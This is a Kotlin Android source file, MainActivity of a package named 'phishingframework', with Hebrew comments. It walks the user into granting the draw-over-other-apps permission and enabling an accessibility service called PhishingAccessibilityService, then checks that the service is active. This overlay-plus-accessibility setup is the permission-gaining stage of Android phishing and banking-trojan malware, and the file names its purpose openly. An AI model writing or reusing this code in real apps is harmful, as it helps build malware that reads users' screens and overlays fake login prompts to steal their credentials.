package com.example.phishingframework

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var overlayRequestLauncher: ActivityResultLauncher<Intent>
    private lateinit var accessibilityRequestLauncher: ActivityResultLauncher<Intent>

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // רישום ה-ActivityResult לטיפול בתוצאת הבקשה להרשאת Overlay
        overlayRequestLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) {
            // אחרי שהמשתמש חזר מההגדרות, בודקים שוב אם יש הרשאה
            if (!Settings.canDrawOverlays(this)) {
                Toast.makeText(
                    this,
                    "אין הרשאה להציג מעל אפליקציות אחרות",
                    Toast.LENGTH_LONG
                ).show()
            }
        }

        // רישום ה-ActivityResult לטיפול בתוצאת הבקשה להפעלת AccessibilityService
        accessibilityRequestLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) {
            // אחרי שהמשתמש חזר מהגדרות הנגישות, בודקים אם השירות שלנו פעיל
            if (!isAccessibilityServiceEnabled()) {
                Toast.makeText(
                    this,
                    "יש להפעיל את שירות הנגישות PhishingAccessibilityService",
                    Toast.LENGTH_LONG
                ).show()
            }
        }

        // שלב ראשון: בדיקה והרשאה להצגת Overlay
        if (!Settings.canDrawOverlays(this)) {
            val overlayIntent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            overlayRequestLauncher.launch(overlayIntent)
        }

        // שלב שני: בדיקה אם שירות הנגישות שלנו פעיל, אם לא - מפנים את המשתמש להגדרות הנגישות
        if (!isAccessibilityServiceEnabled()) {
            val accIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            accessibilityRequestLauncher.launch(accIntent)
        }
    }

    /**
     * בודק האם ה-AccessibilityService שלנו (PhishingAccessibilityService)
     * מופעל ומשובץ ב-Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
     */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedComponent = ComponentName(
            this,
            PhishingAccessibilityService::class.java
        ).flattenToString()

        val enabledServices =
            Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
                ?: return false

        // רשימת השירותים המופעלים מופרדת בנקודה-פסיק
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        for (service in colonSplitter) {
            if (service.equals(expectedComponent, ignoreCase = true)) {
                return true
            }
        }
        return false
    }
}
